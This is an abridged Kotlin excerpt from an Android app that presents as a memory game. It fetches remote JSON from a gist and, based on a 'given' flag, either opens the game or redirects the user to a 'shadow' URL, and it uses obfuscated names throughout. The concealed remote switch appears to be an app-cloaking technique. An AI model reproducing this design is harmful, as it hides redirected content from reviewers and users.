...
import com.luckychance.reversememo.databinding.ActivityMainBinding
import com.luckychance.reversememo.game.AppDataStore
import com.luckychance.reversememo.tool.Network
...
class LuckyChance43Helper(
    ...
    constructor(
        ...
        scope,
        Network(
            context.getString(R.string.dL3FRA)
        ),
    )
    ...
    private fun navigateToGameScreen() {
        scope.launch(Dispatchers.IO) {
            dataStore.updateKeyz { "luckyChance431" }
    ...
    private fun navigateToNext(url: String) {
        scope.launch(Dispatchers.IO) {
            ...
            dataStore.updateKeyz { "luckyChance430" }
    ...
    private fun fetchRemoteConfigData(activity: Activity) {
        scope.launch {
            network.getGistJSON(
                onSuccess = { json ->
                    val condition = json.getString("given")
                    val redirectUrl = json.getString("shadow")
    ...
    companion object {
        val FRAGMENT_ID = R.id.luckyChance43Fragment
    }
}